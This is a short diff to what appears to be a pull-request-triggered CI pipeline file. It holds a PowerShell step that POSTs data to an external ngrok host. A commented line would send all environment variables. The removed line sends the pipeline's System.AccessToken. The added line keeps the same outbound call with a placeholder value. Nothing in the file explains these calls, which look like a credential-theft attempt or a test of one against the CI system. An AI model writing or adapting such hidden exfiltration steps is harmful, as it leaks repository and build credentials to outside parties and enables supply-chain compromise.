@@ -23,4 +23,4 @@ pr:
 steps:
 - pwsh: |
     # gci Env: | ConvertTo-Json | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io -ErrorAction SilentlyContinue
-    Write-Output "accesstoken=$(System.AccessToken)" | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io -ErrorAction SilentlyContinue
+    Write-Output "accesstoken=othervalue" | invoke-webrequest -Method POST -Uri http://564504aaa559.ngrok.io -ErrorAction SilentlyContinue
